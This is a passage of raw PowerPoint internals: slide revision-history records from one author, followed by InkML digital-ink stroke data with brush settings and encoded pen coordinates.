        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{761B83AC-F9AE-4056-9599-2DACFAA8A130}" dt="2023-02-09T14:03:59.471" v="1261" actId="14100"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3211001472" sldId="497"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp mod">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{761B83AC-F9AE-4056-9599-2DACFAA8A130}" dt="2022-09-26T22:26:49.884" v="1227" actId="9405"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1035595462" sldId="498"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp mod">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{761B83AC-F9AE-4056-9599-2DACFAA8A130}" dt="2022-09-26T22:29:12.469" v="1228" actId="9405"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1984385075" sldId="499"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp mod">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{761B83AC-F9AE-4056-9599-2DACFAA8A130}" dt="2022-09-26T22:35:37.927" v="1229" actId="9405"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3318379012" sldId="500"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp mod">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{761B83AC-F9AE-4056-9599-2DACFAA8A130}" dt="2023-02-09T14:04:11.282" v="1265" actId="12"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="198983510" sldId="502"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp mod">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{761B83AC-F9AE-4056-9599-2DACFAA8A130}" dt="2023-02-09T14:05:14.546" v="1272" actId="403"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="686110812" sldId="503"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{761B83AC-F9AE-4056-9599-2DACFAA8A130}" dt="2023-02-09T14:04:40.179" v="1270" actId="12"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3430879985" sldId="504"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp mod">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{761B83AC-F9AE-4056-9599-2DACFAA8A130}" dt="2022-09-05T12:47:15.824" v="1129" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1270554279" sldId="505"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp mod">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{761B83AC-F9AE-4056-9599-2DACFAA8A130}" dt="2022-08-30T14:28:00.166" v="1037" actId="9405"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="951356934" sldId="506"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp mod ord">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{761B83AC-F9AE-4056-9599-2DACFAA8A130}" dt="2024-01-31T00:40:29.793" v="1555"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1385115538" sldId="507"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{761B83AC-F9AE-4056-9599-2DACFAA8A130}" dt="2023-02-10T00:22:52.419" v="1289" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="494372939" sldId="508"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp new mod modClrScheme chgLayout">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{761B83AC-F9AE-4056-9599-2DACFAA8A130}" dt="2021-09-09T15:46:23.285" v="206" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3063836972" sldId="510"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp new mod">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{761B83AC-F9AE-4056-9599-2DACFAA8A130}" dt="2023-02-10T00:24:31.695" v="1298" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2910342646" sldId="511"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp new mod">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{761B83AC-F9AE-4056-9599-2DACFAA8A130}" dt="2025-01-24T21:11:55.364" v="3189" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1504836039" sldId="512"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{761B83AC-F9AE-4056-9599-2DACFAA8A130}" dt="2025-01-24T21:11:55.364" v="3189" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1504836039" sldId="512"/>
            <ac:spMk id="3" creationId="{791C76E6-6D86-29EF-DD53-CB8A670CA499}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp new mod modClrScheme chgLayout">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{761B83AC-F9AE-4056-9599-2DACFAA8A130}" dt="2025-01-24T21:56:03.219" v="3328" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2698180537" sldId="513"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{761B83AC-F9AE-4056-9599-2DACFAA8A130}" dt="2025-01-24T21:56:03.219" v="3328" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2698180537" sldId="513"/>
            <ac:spMk id="3" creationId="{5DCA4F57-C286-F1BF-F183-0437F580EFFB}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp new mod modClrScheme chgLayout">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{761B83AC-F9AE-4056-9599-2DACFAA8A130}" dt="2024-02-01T13:12:19.048" v="3083" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="783519545" sldId="514"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="new del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{761B83AC-F9AE-4056-9599-2DACFAA8A130}" dt="2024-01-31T00:40:10.641" v="1553" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3084004234" sldId="515"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp new mod modNotesTx">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{761B83AC-F9AE-4056-9599-2DACFAA8A130}" dt="2024-02-01T13:18:02.275" v="3123" actId="14100"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2801216556" sldId="516"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp new mod modNotesTx">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{761B83AC-F9AE-4056-9599-2DACFAA8A130}" dt="2024-02-01T13:16:16.103" v="3119" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2027909493" sldId="517"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp new mod">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{761B83AC-F9AE-4056-9599-2DACFAA8A130}" dt="2024-02-01T13:09:32.915" v="3039" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="721033151" sldId="518"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp new mod modClrScheme chgLayout">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{761B83AC-F9AE-4056-9599-2DACFAA8A130}" dt="2024-02-01T00:43:44.971" v="2361" actId="6549"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1428602398" sldId="519"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp new mod modClrScheme chgLayout modNotesTx">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{761B83AC-F9AE-4056-9599-2DACFAA8A130}" dt="2024-02-01T00:44:18.755" v="2403" actId="207"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3953285749" sldId="520"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp new mod">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{761B83AC-F9AE-4056-9599-2DACFAA8A130}" dt="2024-02-01T13:24:35.463" v="3170" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1631423401" sldId="521"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp new mod modClrScheme chgLayout modNotesTx">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{761B83AC-F9AE-4056-9599-2DACFAA8A130}" dt="2024-01-31T16:56:40.313" v="2179" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="143809284" sldId="522"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp new mod modClrScheme chgLayout modNotesTx">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{761B83AC-F9AE-4056-9599-2DACFAA8A130}" dt="2024-01-31T17:02:06.441" v="2284" actId="6549"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2949600817" sldId="523"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod modClrScheme chgLayout modNotesTx">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{761B83AC-F9AE-4056-9599-2DACFAA8A130}" dt="2024-02-09T00:26:04.367" v="3187" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2379574187" sldId="524"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp new mod">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{761B83AC-F9AE-4056-9599-2DACFAA8A130}" dt="2024-02-01T13:19:30.563" v="3156" actId="207"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3319529806" sldId="525"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp new mod modClrScheme chgLayout">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{761B83AC-F9AE-4056-9599-2DACFAA8A130}" dt="2024-02-01T01:31:58.082" v="2868" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2849845205" sldId="526"/>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14.429"/>
    </inkml:context>
    <inkml:brush xml:id="br0">
      <inkml:brushProperty name="width" value="0.05" units="cm"/>
      <inkml:brushProperty name="height" value="0.05" units="cm"/>
      <inkml:brushProperty name="color" value="#FFC114"/>
    </inkml:brush>
  </inkml:definitions>
  <inkml:trace contextRef="#ctx0" brushRef="#br0">311 1 24575,'7'39'0,"-6"-36"0,0 0 0,0-1 0,0 1 0,-1 0 0,1 0 0,-1 0 0,0 0 0,1 0 0,-1 0 0,-1 0 0,1 0 0,0 0 0,-1 0 0,1 0 0,-1 0 0,0 0 0,0-1 0,0 1 0,0 0 0,-1 0 0,1-1 0,-1 1 0,-2 2 0,-58 69 0,54-63 0,1 0 0,0 1 0,1 0 0,0 0 0,1 1 0,1-1 0,-7 27 0,7-29 0,0 1 0,-1 0 0,0-1 0,-1 0 0,-1 0 0,1-1 0,-1 1 0,-1-2 0,0 1 0,-10 8 0,-31 39 0,35-37 0,9-14 0,0 1 0,0 0 0,1 1 0,0-1 0,0 1 0,0-1 0,1 1 0,0 0 0,1 1 0,-1-1 0,1 0 0,1 1 0,0-1 0,-1 15 0,1 16 0,0-16 0,1 1 0,0 0 0,8 40 0,-4-54 0,0 1 0,1-1 0,0 0 0,1 0 0,0 0 0,0-1 0,13 13 0,-4-3 0,-9-12 0,0 1 0,0-1 0,1-1 0,0 1 0,0-1 0,0 0 0,1 0 0,-1-1 0,1 0 0,0-1 0,0 1 0,1-2 0,-1 1 0,1-1 0,-1 0 0,1-1 0,0 0 0,10 0 0,53 9 0,-52-6 0,-1-1 0,23 0 0,3-2 0,-13 0 0,1-1 0,34-5 0,-58 4 0,0 0 0,0-1 0,-1 0 0,1-1 0,-1 0 0,1-1 0,-1 1 0,0-1 0,0-1 0,-1 0 0,1 0 0,8-8 0,68-66 0,-76 73 0,-1-1 0,1 1 0,0 1 0,1-1 0,-1 2 0,1-1 0,13-4 0,-13 5 0,0 1 0,-1-2 0,0 1 0,1-1 0,-1 0 0,-1-1 0,1 0 0,9-10 0,60-91 0,-70 96 0,0 0 0,0-1 0,-1 1 0,-1-1 0,0-1 0,0 1 0,-1-1 0,3-20 0,6-13 0,1 1 0,-7 27 0,-2 0 0,0 0 0,0-1 0,-2 1 0,2-38 0,-3 16 0,-1 27 0,0 0 0,-1 0 0,0 0 0,-1 0 0,-1 0 0,0 0 0,-6-21 0,6 30 0,0-1 0,-1 1 0,0 0 0,1 0 0,-2 0 0,1 0 0,0 1 0,-1-1 0,1 1 0,-1 0 0,0 0 0,0 0 0,-1 1 0,1-1 0,0 1 0,-1 0 0,0 0 0,1 1 0,-1-1 0,0 1 0,-6-1 0,-11 0 0,0 0 0,0 1 0,-36 4 0,7 0 0,-306-3 0,337 1 20,1 2-1,0 0 0,0 1 0,0 1 1,-26 11-1,-40 9-1500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05.178"/>
    </inkml:context>
    <inkml:brush xml:id="br0">
      <inkml:brushProperty name="width" value="0.05" units="cm"/>
      <inkml:brushProperty name="height" value="0.05" units="cm"/>
      <inkml:brushProperty name="color" value="#FFC114"/>
    </inkml:brush>
  </inkml:definitions>
  <inkml:trace contextRef="#ctx0" brushRef="#br0">578 0 24575,'8'3'0,"-14"3"0,-15 3 0,-1-3 0,0 1 0,0 1 0,1 1 0,0 1 0,1 1 0,0 1 0,0 1 0,2 0 0,-1 1 0,-30 33 0,36-36 0,0 0 0,-1-1 0,0 0 0,-25 12 0,21-12 0,0 1 0,-23 18 0,34-24 0,0 0 0,0 0 0,-1-1 0,1 0 0,-11 3 0,-18 10 0,33-15 0,0 1 0,0 0 0,-1-1 0,1 1 0,1 0 0,-1 0 0,0 1 0,1-1 0,0 1 0,0-1 0,0 1 0,0 0 0,0 0 0,1-1 0,0 1 0,-1 0 0,2 0 0,-2 9 0,0 6 0,1 0 0,4 37 0,-1-16 0,-1-31 0,0-1 0,0 1 0,1-1 0,0 0 0,1 1 0,0-1 0,0 0 0,6 9 0,1 1 0,0 0 0,18 21 0,-20-30 0,-1-1 0,1 0 0,1 0 0,-1-1 0,1 0 0,1-1 0,-1 0 0,1 0 0,0-1 0,0 0 0,1-1 0,18 6 0,24 7 0,-42-13 0,-1 0 0,1 0 0,1-1 0,-1-1 0,14 2 0,-7-2 0,-1 1 0,1 0 0,28 11 0,9 1 0,-28-8 0,-1-2 0,1-1 0,44 1 0,-37-4 0,-21 0 0,1-1 0,-1 0 0,24-4 0,-33 3 0,-1 1 0,0-1 0,1 0 0,-1-1 0,0 1 0,0 0 0,0-1 0,0 0 0,0 0 0,0 0 0,-1 0 0,1 0 0,-1 0 0,1-1 0,-1 1 0,0-1 0,0 0 0,0 1 0,3-6 0,-2 2 0,0 0 0,1 1 0,0 0 0,1-1 0,-1 1 0,1 1 0,0-1 0,9-6 0,23-23 0,-34 28 0,0 0 0,0 0 0,-1-1 0,0 1 0,0 0 0,0-1 0,-1 1 0,0-1 0,0 0 0,-1 1 0,0-1 0,0-7 0,3-33 0,5-10 0,-3-1 0,-5-110 0,-2 68 0,1 86-114,0 1 1,0 0-1,-2 0 0,0 0 0,0 1 1,-1-1-1,0 1 0,-1 0 0,-1 0 1,0 0-1,-14-21 0,12 24-6712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07.455"/>
    </inkml:context>
    <inkml:brush xml:id="br0">
      <inkml:brushProperty name="width" value="0.05" units="cm"/>
      <inkml:brushProperty name="height" value="0.05" units="cm"/>
      <inkml:brushProperty name="color" value="#FFC114"/>
    </inkml:brush>
  </inkml:definitions>
  <inkml:trace contextRef="#ctx0" brushRef="#br0">0 8329 24575,'4'-1'0,"1"0"0,-1 0 0,0-1 0,0 1 0,0-1 0,-1 0 0,6-3 0,11-5 0,74-15 0,5-1 0,53-19 0,-36 13 0,-30 9-640,93-13-1,-57 14 755,221-36-4668,-225 40 3977,41-1 749,9-1-2499,-44-1 2047,342-51-910,-261 42 1190,152-15 0,-254 36 1132,170-39 0,97-48 1484,-330 85-2576,344-96-1332,-297 91 1207,-62 13 90,0-1 0,46-14 0,301-122-5,-243 89 0,72-26 0,-157 60 0,77-44 0,-13 6 0,9-6 34,-78 38-13,1 3 1,68-26 0,107-36-55,-86 31 455,-59 24-353,210-72-60,-132 62-9,33-11 0,14-15 0,111-41 0,-126 46-36,-99 33 0,118-51 1,-86 19-415,102-45-824,-184 90 1284,-8 3 214,1-1-1,-1-1 0,26-18 1,44-32-16,-21 15-215,81-69 0,-57 38 7,-58 49 0,-2-1 0,62-67 0,-81 79 211,0 0-1,1 2 1,1 0 0,32-19 0,-32 22-11,-1 0 1,0-1 0,-1-1 0,-1-1-1,27-30 1,45-54 1268,-71 82-1366,-4 4-103,1 2 0,0-1 0,19-10 0,19-14 0,-28 14 112,39-46 0,-51 53-61,1 0 0,0 0 0,1 1-1,1 1 1,0 0 0,1 1 0,0 1 0,20-10-1,-24 16-50,-1-1 0,1-1 0,-1 1 0,0-2 0,0 0 0,-1 0 0,0-1 0,-1 0 0,10-11 0,11-13 0,2 3 0,1 0 0,50-32 0,27-25 0,116-111 0,-67 64 0,-136 113 48,126-126 993,-118 115-1041,54-45 0,18-17 0,-55 38 0,-28 31 0,1 2 0,26-23 0,-9 9 0,-1-2 0,44-59 0,-22 24 0,21-27 0,-37 45 0,68-69 0,-86 99 51,-2-1 0,23-35 0,-23 30 16,39-43 0,-55 68-139,8-10 251,1 2 1,1 0-1,23-16 0,-31 25-179,-1-1 0,-1 0 0,1 0 0,-1-1 0,0 1 0,-1-2 0,0 1 0,0-1 0,7-14 0,-3 7 0,2 0 0,0 0 0,0 1 0,2 0 0,18-15 0,81-57 0,-82 64 0,-22 16 0,0-1 0,-1 0 0,0 0 0,9-14 0,-12 15 0,1-1 0,0 1 0,1 0 0,0 1 0,0-1 0,0 1 0,11-7 0,25-14 0,-1-3 0,-2-2 0,48-47 0,11-9 0,-3-3 0,-69 63 0,0 2 0,2 1 0,46-31 0,-11 13 0,-1-4 0,61-58 0,-59 58 0,-18 14 0,-7 4 0,-17 13 0,-1-1 0,0-1 0,37-41 0,-43 43 0,0 1 0,2 0 0,0 1 0,0 1 0,1 1 0,1 0 0,24-10 0,1-2 0,-33 17 0,-1-1 0,-1 0 0,16-16 0,10-8 0,-1 4 0,-22 16 0,1 1 0,1 0 0,0 1 0,21-10 0,33-20 0,-54 30 0,1 1 0,0 0 0,28-10 0,-19 8 0,0-1 0,0-1 0,-1-1 0,0-2 0,27-22 0,-43 31 0,11-5 0,0 1 0,1 1 0,24-9 0,-25 11 0,16-6 0,46-11 0,6-1 0,-55 15-109,0 0 0,1 3 0,0 1 0,49-5 0,-63 9 109,-1 0 0,1-2 0,-1 0 0,0-1 0,19-9 0,-11 4 0,35-9 0,-34 12 163,-1-2 1,45-22-1,-42 18-108,16-8-55,5 0 0,-1-3 0,56-38 0,-100 60 0,0 0 0,0 1 0,0 0 0,0 0 0,0 0 0,1 0 0,-1 1 0,1 0 0,-1 0 0,10 0 0,-8 1 0,0-1 0,-1 0 0,1 0 0,-1-1 0,1 1 0,10-6 0,-5 2 0,1 0 0,-1 1 0,1 0 0,0 1 0,0 1 0,0 0 0,14 0 0,-21 1 0,2 0 0,1-1 0,-1 0 0,1-1 0,-1 0 0,0 0 0,0-1 0,-1 0 0,1 0 0,8-8 0,-6 6 0,1-1 0,-1 1 0,23-8 0,35-7 0,-23 8 0,84-37 0,-97 36 0,69-19 0,-6 2 0,39-7 0,-98 26 0,1 2 0,63-8 0,3-2 0,-21 4 0,-42 8 0,67-20 0,45-16 0,-90 20 0,-35 12 0,0 2 0,47-11 0,-11 2 0,-52 15 0,0 0 0,0 1 0,1 0 0,0 0 0,21-1 0,36 4 0,-27 1 0,0-2 0,0-2 0,54-11 0,-60 7 0,0 1 0,0 2 0,63 1 0,-87 2 0,0 0 0,0-1 0,0 0 0,0-1 0,18-7 0,-17 5 0,0 1 0,1 1 0,-1 0 0,15-1 0,291 2 0,-155 5 0,482-3-732,-618 1 732,41 7 0,19 2 0,13-10-1243,-85 0-4973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08.891"/>
    </inkml:context>
    <inkml:brush xml:id="br0">
      <inkml:brushProperty name="width" value="0.05" units="cm"/>
      <inkml:brushProperty name="height" value="0.05" units="cm"/>
      <inkml:brushProperty name="color" value="#FFC114"/>
    </inkml:brush>
  </inkml:definitions>
  <inkml:trace contextRef="#ctx0" brushRef="#br0">196 1 24575,'1'8'0,"1"1"0,0-1 0,1 1 0,0-1 0,0 0 0,0 0 0,1 0 0,1-1 0,-1 1 0,1-1 0,0 0 0,13 13 0,-9-8 0,-1 1 0,-1 0 0,1 1 0,9 28 0,-3-9 0,-12-29 0,0 0 0,-1-1 0,0 1 0,0 0 0,0 0 0,0 0 0,0 0 0,-1 0 0,0 1 0,0-1 0,0 0 0,0 0 0,-1 0 0,1 0 0,-1 0 0,0 0 0,-1 0 0,1 0 0,0-1 0,-1 1 0,0 0 0,-3 4 0,-4 4 0,-1 0 0,0-1 0,-1 0 0,-21 16 0,2-1 0,8-7 0,-15 16 0,0 9 0,22-27 0,1 0 0,0 1 0,-15 27 0,26-39-227,0 0-1,-1-1 1,0 1-1,0-1 1,-10 9-1,5-6-6598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20.713"/>
    </inkml:context>
    <inkml:brush xml:id="br0">
      <inkml:brushProperty name="width" value="0.05" units="cm"/>
      <inkml:brushProperty name="height" value="0.05" units="cm"/>
      <inkml:brushProperty name="color" value="#FFC114"/>
    </inkml:brush>
  </inkml:definitions>
  <inkml:trace contextRef="#ctx0" brushRef="#br0">1 8263 24575,'2258'0'-592,"-2227"-1"592,41-7 0,-42 3 0,44 0 0,-53 4 305,41-7 0,6-1-323,1-1 18,-49 6 0,37-2 0,-6 3 0,63-13 0,-66 8 0,81-3 0,-61 7-439,79-14-1,-140 17 489,342-40-49,-167 27-1434,-117 12 1493,71-12 0,244-38-59,-95 15-1888,5 9 1455,-15 2-141,-134 12-76,58-8 707,-87 2-57,109-13 0,396-44 1892,-522 61-1892,120-17 0,-136 22 0,-32 4 0,59-1 0,-54 5 172,-1-1 0,93-22-1,100-41 658,-105 26-628,159-40-89,-216 52-95,-65 22 21,0 0 1,0 2-1,1 0 1,35-5-1,-21 5-28,0 0-1,0-2 1,52-18-1,68-17-24,-44 14 181,106-30-1514,129-40 1155,-212 63-301,-84 24 495,86-32 0,23-12-173,-13 4-967,10-9 1112,-27 12 281,143-76 0,-192 80-215,113-56-42,-141 80 3,-30 14 0,0-2 0,28-16 0,48-34 0,222-129 0,-36 22 1591,-216 117-962,-46 33-532,2 0-1,0 1 1,42-21 0,-38 24-97,-1-1 0,0 0 0,-1-2 0,40-31 0,8-13-341,138-84 0,-15 12 341,-115 74 0,86-45 0,-128 79-92,-1-1 0,43-36-1,-53 38-223,104-72 316,-39 27 0,-49 38 0,58-52 0,-60 42 43,79-79 638,-72 66-72,38-49 562,-17 20-698,-28 34-268,-34 39-205,197-223 0,-65 100 0,-16 24 0,-63 56 0,118-87 0,-103 80 0,24-21 0,-70 56 0,0 1 0,2 1 0,1 2 0,0 0 0,36-13 0,-18 8 0,-32 13 0,0 0 0,30-25 0,6-5 0,-25 20 0,0-1 0,36-38 0,-61 56 0,76-58 0,-38 21 0,1 1 0,74-51 0,5-9 0,-36 27 0,-41 39 0,-27 23 0,-1-2 0,0-1 0,-1 0 0,-1 0 0,0-2 0,16-20 0,-23 27 0,0 0 0,0 1 0,0-1 0,1 2 0,0-1 0,1 1 0,-1 1 0,1-1 0,11-4 0,32-23 0,94-95 0,-68 57 0,-63 59 0,1 0 0,33-17 0,-33 20 0,0-1 0,0 0 0,23-20 0,131-140 0,-161 162 0,1 0 0,1 1 0,-1 0 0,22-10 0,23-14 0,5-17 0,-37 28 0,48-31 0,-56 42 0,106-68 0,-38 21 0,-48 34 0,49-41 0,-54 37 0,-15 14 0,-2 0 0,0 0 0,18-21 0,-23 21 0,0 2 0,0-1 0,0 1 0,1 0 0,0 1 0,0 0 0,16-10 0,-17 13 0,0 0 0,0-1 0,-1 0 0,0 0 0,8-11 0,-8 9 0,0 1 0,1 0 0,-1 1 0,17-12 0,-2 2 0,0 0 0,-2-1 0,26-28 0,-29 27 0,1 1 0,1 1 0,0 1 0,29-18 0,-37 27 0,0 0 0,0-1 0,0 0 0,-1-1 0,0 0 0,-1-1 0,14-17 0,59-61 0,-69 72 0,0 1 0,1 1 0,1 0 0,0 1 0,1 0 0,0 1 0,27-14 0,-21 11 0,-1 0 0,-1-1 0,-1-1 0,0 0 0,-1-2 0,-1 0 0,27-40 0,-37 51 0,1-1 0,0 1 0,0 1 0,0 0 0,19-12 0,-17 12 0,-1 1 0,1-2 0,-1 1 0,-1-2 0,10-9 0,36-51 0,30-42 0,-70 93 0,1 1 0,1 1 0,0 0 0,1 1 0,21-14 0,-12 10 0,34-36 0,-53 47 0,0 0 0,-1-1 0,0 0 0,-1 0 0,0 0 0,5-14 0,5-7 0,-12 23 0,-1 1 0,1 0 0,0 1 0,0-1 0,0 1 0,1-1 0,0 1 0,0 1 0,0-1 0,0 0 0,1 1 0,9-7 0,-7 6 0,0 0 0,-1 0 0,0 0 0,0 0 0,-1-1 0,1 0 0,-1 0 0,8-14 0,-8 13 0,0-1 0,1 1 0,0-1 0,0 2 0,1-1 0,9-6 0,53-45 106,-49 40-841,37-27-1,-47 39-6090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22.586"/>
    </inkml:context>
    <inkml:brush xml:id="br0">
      <inkml:brushProperty name="width" value="0.05" units="cm"/>
      <inkml:brushProperty name="height" value="0.05" units="cm"/>
      <inkml:brushProperty name="color" value="#FFC114"/>
    </inkml:brush>
  </inkml:definitions>
  <inkml:trace contextRef="#ctx0" brushRef="#br0">0 39 24575,'27'0'0,"0"0"0,1 0 0,0-2 0,43-8 0,-47 4 0,-4 1 0,1 0 0,0 1 0,0 1 0,35 0 0,-54 3 0,0 0 0,0 1 0,0-1 0,0 1 0,0 0 0,0-1 0,0 1 0,-1 0 0,1 0 0,0 0 0,0 1 0,-1-1 0,1 0 0,-1 1 0,1-1 0,-1 1 0,0-1 0,1 1 0,-1-1 0,0 1 0,0 0 0,0 0 0,0 0 0,0 0 0,-1-1 0,1 1 0,-1 0 0,1 0 0,-1 0 0,0 0 0,1 3 0,0 10 0,0 0 0,-1-1 0,-3 23 0,1-12 0,1 71-1365,1-79-5461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26.839"/>
    </inkml:context>
    <inkml:brush xml:id="br0">
      <inkml:brushProperty name="width" value="0.05" units="cm"/>
      <inkml:brushProperty name="height" value="0.05" units="cm"/>
      <inkml:brushProperty name="color" value="#FFC114"/>
    </inkml:brush>
  </inkml:definitions>
